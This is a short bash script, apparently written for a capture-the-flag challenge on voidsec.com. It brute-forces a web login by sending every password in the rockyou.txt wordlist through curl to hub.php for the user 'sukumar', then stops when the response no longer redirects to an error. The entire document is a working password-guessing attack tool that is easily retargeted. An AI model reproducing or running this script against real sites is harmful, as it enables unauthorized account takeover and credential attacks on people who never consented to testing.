#!/bin/bash
while read pass;
do
        echo -ne " Pass: $pass                   \r";
        tmp=$(curl 'http://hackme.voidsec.com/hub.php' -H 'Origin: http://hackme.voidsec.com' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: it,en-US;q=0.8,en;q=0.6' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.22 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Referer: http://ctftest651126.voidsec.com/login.php' -H 'Connection: keep-alive' -H 'DNT: 1' --data "username=sukumar&password=${pass}" --compressed -vvv 2>&1);
        echo "$tmp" | grep "^< " | grep "Location" | grep "uerror" >/dev/null
        if [ $? -ne 0 ];
        then
                echo "$tmp" | more;
                echo "Found using: $pass";
                break;
        fi;
done < rockyou.txt;
echo "";
